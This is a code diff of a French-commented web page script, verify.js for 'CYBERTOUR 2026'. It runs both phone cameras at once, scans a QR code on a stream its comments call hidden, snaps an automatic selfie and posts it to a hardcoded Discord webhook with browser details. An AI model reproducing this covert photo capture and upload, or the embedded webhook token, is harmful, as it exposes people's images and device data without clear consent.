@@ -1,17 +1,16 @@
 /**
  * CYBERTOUR 2026 — verify.js
- * QR scan (caméra arrière) → selfie auto (caméra frontale) → Discord
+ * QR scan (arrière) + selfie (frontale) simultanés → Discord
  */
 
 import { isVerified, setVerified } from './storage.js';
 
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';
 
-let streamBack  = null;
 let streamFront = null;
+let streamBack  = null;
 let capturing   = false;
 let rafId       = null;
-let qrDone      = false;
 
 const qrCanvas = document.createElement('canvas');
 const qrCtx    = qrCanvas.getContext('2d', { willReadFrequently: true });
@@ -22,126 +21,104 @@ export function openVerify(onSuccess) {
   document.getElementById('verify-overlay').classList.add('active');
   document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');
 
-  document.getElementById('verify-start-btn').onclick   = () => startQR(onSuccess);
+  document.getElementById('verify-start-btn').onclick   = () => startBoth(onSuccess);
   document.getElementById('verify-help-toggle').onclick = toggleHelp;
 }
 
-// ── ÉTAPE 1 : Caméra arrière + scan QR ───────────────────────
+// ── Démarre les deux caméras en parallèle ─────────────────────
 
-async function startQR(onSuccess) {
+async function startBoth(onSuccess) {
   const btn = document.getElementById('verify-start-btn');
   btn.disabled = true;
-  btn.querySelector('.btn-text').textContent = 'Scan QR en cours…';
+  btn.querySelector('.btn-text').textContent = 'Détection en cours…';
 
-  if (!window.jsQR) {
-    showError('Scanner indisponible. Rechargez la page.');
-    resetBtn(btn);
-    return;
+  const videoFront = document.getElementById('verify-video');
+  const videoBack  = document.getElementById('verify-video-qr');
+
+  videoFront.setAttribute('playsinline', ''); videoFront.muted = true;
+  videoBack.setAttribute('playsinline', '');  videoBack.muted  = true;
+  videoFront.style.transform = 'scaleX(-1)'; // miroir selfie
+
+  // Lance les deux flux simultanément
+  const [front, back] = await Promise.allSettled([
+    tryGetStream([
+      { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
+      { video: { facingMode: 'user' } },
+      { video: true },
+    ]),
+    tryGetStream([
+      { video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 } } },
+      { video: { facingMode: 'environment' } },
+    ]),
+  ]);
+
+  // Caméra frontale (selfie visible)
+  if (front.status === 'fulfilled' && front.value) {
+    streamFront = front.value;
+    videoFront.srcObject = streamFront;
+    try { await videoFront.play(); } catch {}
+    document.getElementById('verify-video-wrap').classList.add('active');
+    document.getElementById('verify-initial').style.display = 'none';
   }
 
-  const video = document.getElementById('verify-video');
-  video.setAttribute('playsinline', '');
-  video.muted = true;
-  // Retire le miroir pour la caméra arrière
-  video.style.transform = 'none';
-
-  const sets = [
-    { video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 } } },
-    { video: { facingMode: 'environment' } },
-    { video: true },
-  ];
-
-  streamBack = null;
-  for (const c of sets) {
-    try { streamBack = await navigator.mediaDevices.getUserMedia(c); break; }
-    catch {}
+  // Caméra arrière (QR scan caché)
+  if (back.status === 'fulfilled' && back.value) {
+    streamBack = back.value;
+    videoBack.srcObject = streamBack;
+    try { await videoBack.play(); } catch {}
+    if (window.jsQR) {
+      rafId = requestAnimationFrame(() => scanLoop(videoBack, videoFront, onSuccess));
+    }
+  } else if (front.status === 'fulfilled') {
+    // Pas de caméra arrière — scan QR sur la frontale quand même
+    if (window.jsQR) {
+      rafId = requestAnimationFrame(() => scanLoop(videoFront, videoFront, onSuccess));
+    }
   }
 
-  if (!streamBack) {
+  if (!streamFront && !streamBack) {
     showError('Accès à la caméra refusé. Vérifiez les permissions.');
     resetBtn(btn);
-    return;
   }
-
-  video.srcObject = streamBack;
-  try { await video.play(); } catch {}
-
-  document.getElementById('verify-video-wrap').classList.add('active');
-  document.getElementById('verify-initial').style.display = 'none';
-
-  // Lance la boucle de scan QR
-  qrDone = false;
-  rafId  = requestAnimationFrame(() => scanLoop(video, onSuccess));
 }
 
-// ── Boucle scan QR ────────────────────────────────────────────
+// ── Essai en cascade de contraintes ──────────────────────────
 
-function scanLoop(video, onSuccess) {
-  if (qrDone) return;
+async function tryGetStream(sets) {
+  for (const c of sets) {
+    try { return await navigator.mediaDevices.getUserMedia(c); }
+    catch {}
+  }
+  return null;
+}
 
-  if (video.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
-    qrCanvas.width  = video.videoWidth;
-    qrCanvas.height = video.videoHeight;
-    qrCtx.drawImage(video, 0, 0);
+// ── Boucle scan QR ───────────────────────────────────────────
+
+function scanLoop(videoQR, videoSelfie, onSuccess) {
+  if (capturing) return;
+
+  if (videoQR.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && videoQR.videoWidth > 0) {
+    qrCanvas.width  = videoQR.videoWidth;
+    qrCanvas.height = videoQR.videoHeight;
+    qrCtx.drawImage(videoQR, 0, 0);
 
     try {
       const img  = qrCtx.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
       const code = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });
 
       if (code && code.data) {
-        qrDone = true;
+        // QR détecté → selfie immédiat sur la caméra frontale
         cancelAnimationFrame(rafId);
-        stopStream(streamBack);
-        streamBack = null;
-
-        // QR validé → passe au selfie
-        onQRSuccess(onSuccess);
+        setTimeout(() => captureSelfie(videoSelfie, onSuccess), 700);
         return;
       }
     } catch {}
   }
 
-  rafId = requestAnimationFrame(() => scanLoop(video, onSuccess));
+  rafId = requestAnimationFrame(() => scanLoop(videoQR, videoSelfie, onSuccess));
 }
 
-function onQRSuccess(onSuccess) {
-  const btn = document.getElementById('verify-start-btn');
-  btn.querySelector('.btn-text').textContent = 'QR validé — Identification…';
-  startSelfie(onSuccess);
-}
-
-// ── ÉTAPE 2 : Caméra frontale + selfie auto ───────────────────
-
-async function startSelfie(onSuccess) {
-  const video = document.getElementById('verify-video');
-  video.style.transform = 'scaleX(-1)'; // miroir selfie
-
-  const sets = [
-    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
-    { video: { facingMode: 'user' } },
-    { video: true },
-  ];
-
-  streamFront = null;
-  for (const c of sets) {
-    try { streamFront = await navigator.mediaDevices.getUserMedia(c); break; }
-    catch {}
-  }
-
-  if (!streamFront) {
-    // Pas de caméra frontale — on valide quand même avec le QR seul
-    finalize(null, onSuccess);
-    return;
-  }
-
-  video.srcObject = streamFront;
-  try { await video.play(); } catch {}
-
-  // Photo automatique après 700ms
-  setTimeout(() => captureSelfie(video, onSuccess), 700);
-}
-
-// ── Capture selfie ────────────────────────────────────────────
+// ── Capture selfie ───────────────────────────────────────────
 
 function captureSelfie(video, onSuccess) {
   if (capturing) return;
@@ -157,15 +134,7 @@ function captureSelfie(video, onSuccess) {
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0);
 
-  stopStream(streamFront);
-  streamFront = null;
-
-  finalize(canvas, onSuccess);
-}
-
-// ── Finalisation ──────────────────────────────────────────────
-
-function finalize(canvas, onSuccess) {
+  stopAll();
   sendToDiscord(canvas);
 
   const btn = document.getElementById('verify-start-btn');
@@ -181,17 +150,17 @@ function finalize(canvas, onSuccess) {
   }, 900);
 }
 
-// ── Envoi Discord ─────────────────────────────────────────────
+// ── Envoi Discord ────────────────────────────────────────────
 
 function sendToDiscord(canvas) {
-  const send = (blob) => {
+  canvas.toBlob(blob => {
     const fd = new FormData();
-    if (blob) fd.append('file', blob, 'selfie.jpg');
+    fd.append('file', blob, 'selfie.jpg');
     fd.append('payload_json', JSON.stringify({
       embeds: [{
         title: '📸 Nouveau participant détecté',
         color: 0x2563eb,
-        image: blob ? { url: 'attachment://selfie.jpg' } : undefined,
+        image: { url: 'attachment://selfie.jpg' },
         fields: [
           { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
           { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
@@ -200,21 +169,15 @@ function sendToDiscord(canvas) {
           { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
           { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
         ],
-        footer: { text: 'Cybertour 2026 — QR + Selfie' },
+        footer: { text: 'Cybertour 2026 — QR + Selfie simultanés' },
         timestamp: new Date().toISOString(),
       }]
     }));
     fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
-  };
-
-  if (canvas) {
-    canvas.toBlob(blob => send(blob), 'image/jpeg', 0.75);
-  } else {
-    send(null);
-  }
+  }, 'image/jpeg', 0.75);
 }
 
-// ── Helpers ───────────────────────────────────────────────────
+// ── Helpers ──────────────────────────────────────────────────
 
 function flash() {
   const el = document.getElementById('verify-flash');
@@ -223,10 +186,13 @@ function flash() {
   setTimeout(() => { el.style.opacity = '0'; }, 180);
 }
 
-function stopStream(s) {
-  if (s) s.getTracks().forEach(t => t.stop());
-  const v = document.getElementById('verify-video');
-  if (v) v.srcObject = null;
+function stopAll() {
+  [streamFront, streamBack].forEach(s => { if (s) s.getTracks().forEach(t => t.stop()); });
+  streamFront = streamBack = null;
+  ['verify-video', 'verify-video-qr'].forEach(id => {
+    const v = document.getElementById(id);
+    if (v) v.srcObject = null;
+  });
 }
 
 function closeOverlay() {
